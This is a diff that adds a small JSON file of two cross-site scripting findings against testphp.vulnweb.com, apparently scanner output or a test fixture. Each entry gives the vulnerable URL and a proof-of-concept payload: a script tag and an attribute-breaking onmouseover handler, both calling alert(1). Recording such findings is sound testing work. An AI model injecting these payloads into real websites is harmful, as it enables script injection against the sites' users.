@@ -1,0 +1,12 @@
+[
+  {
+    "type": "XSS",
+    "url": "http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "<script>alert(1)</script>"
+  },
+  {
+    "type": "XSS",
+    "url": "http://testphp.vulnweb.com/search.php?test=query",
+    "payload": "\" onmouseover=\"alert(1)\""
+  }
+]
